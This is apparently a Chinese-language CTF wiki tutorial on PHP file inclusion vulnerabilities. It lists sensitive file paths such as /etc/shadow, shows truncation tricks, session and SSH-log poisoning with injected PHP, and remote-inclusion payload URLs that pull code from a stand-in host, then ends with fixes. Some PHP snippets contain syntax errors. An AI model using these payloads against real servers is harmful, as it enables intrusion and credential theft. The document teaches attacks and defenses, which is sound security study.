# 文件包含漏洞简介
文件包含函数[PHP文件包含常见函数](PHP文件包含常见函数.md)的参数如果没有经过过滤或者严格的定义，并且参数可以被用户控制，这样就可能包含非预期文件。如果文件中存在恶意代码，无论文件是什么类型，文件内的恶意代码都会被解析并执行。


# 无限制的本地文件包含

Windows系统常见敏感文件路径：
```
c:\boot.ini			系统版本信息
c:\xxx\php.ini		PHP配置信息
c:\xxx\my.ini		MySQL配置信息
c:\xxx\httpd.conf	Apache配置信息
```
Linux系统常见敏感文件路径：
```
/etc/passwd					Linux系统账号信息
/etc/shadow					Linux 系统中用户的密码信息
/etc/httpd/conf/httpd.conf	Apache配置信息
/etc/my.conf				MySQL配置信息
/usr/etc/php.ini			PHP配置信息
```
示例：

``FI.php?file=../../../../../../../../../etc/passwd``

# 有限制的本地文件包含

## %00截断
利用条件：
1. magic_quotes_gpc=off;
2. PHP版本低于5.3.4.

示例：

``FI.php?file=../../../../../../../../../../../../boot.ini%00``

## 路径长度截断
利用条件：
1. Windows下目录的最大路径长度为256B；
2. Linux下目录的最大路径长度为4096B；

代码示例：
```
<?PHP 
	&filename=&_GET['filename'];
	include(filename."html");
?>
```
playload示例：

```FI.php?file=test.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././```

## 点号截断
点号截断适用于Windows系统，当点号长度大于256B的时候，会造成拓展名截断。

代码示例：
```
<?PHP 
	&filename=&_GET['filename'];
	include(filename."html");
?>
```

playload示例：

```FI.php?file=test.txt.......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................```

# Session文件包含
示例代码：
```
<?php
session_start();
$ctfs=$_Get['ctfs'];
$_SESSION["username"]=$ctfs;
?>
```

利用条件：
1. Session的存储位置可以获取，一般通过phpinfo()或猜测得到，例如Linux通常在``/var/lib/php/Session``目录下；
2. Session内容可控，例如$ctfs变量值可通过GET型ctfs 参数传入。

漏洞利用：
``http://www.ctfs.com/session.php?ctfs=<?php phpinfo();?>``
访问后会在/var/lib/php/Session目录下将ctfs传入的值写入Session文件中。

# 日志文件包含
## 中间件日志文件包含

利用条件：Web中间件日志文件的存储位置已知，并且有可读权限。

漏洞利用：将恶意代码写入日志文件中
``http://192.168.1.1/fi/<?php phpinfo();?>``
需要使用Burp Suite抓包修改浏览器编码后的数据包。

## SSH日志文件包含
利用条件：SSH日志文件存储路径已知并且有可读权限，默认为``/var/log/auth.log``

漏洞利用：将恶意代码写入日志文件
``ssh "<?php phpinfo();?>"@127.1.1.1``

访问日志文件：

``http://192.168.1.2/fi/index.php?filename=../../../../../../../../../../../../../../../../../../var/log/autho.log``


# 无限制远程文件包含

利用条件：
``allow_url_fopen=on``以及``allow_url_include=on``

代码示例：
```
<?PHP 
	&filename=&_GET['filename'];
	include($filename);
?>
```

漏洞利用:
``http://www.ctfs-wiki.com/FI/index.php?filename=http://192.168.91.133/FI/php.txt``

# 有限制的远程文件包含

有限制远程文件包含是指当代码存在特定的前缀或者.php 、.html 等扩展名过滤时，需要绕过才能执行URL中的恶意代码
示例代码：
```
<?php
	include($_GET['filename']."html");
?>
```

## 问号绕过
可以在问号 (?) 后面添加HTML字符串，问号后面的扩展名 .html 会被当做查询，从而绕过。

``http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?``

## ＃号绕过
可以在＃号后面添加HTML字符串，＃号会截断后面的扩展名 .html ，从而绕过。＃号URL编码为%23。

``http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23``

## 空格绕过
利用Burp Suite fuzz发现，除了 ？和 ＃ 号，空格也可以绕过。

``http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%20``


# PHP伪协议包含[PHP伪协议](PHP伪协议.md)

# 修复建议
## 服务器安全配置：
1. 修改PHP配置文件，将`open_basedir`的值设置为可以包含的特定目录，在后面加/，例如，`open_basedir=/var/www/html/`
2. 关闭`allow_url_include`可以防止远程文件包含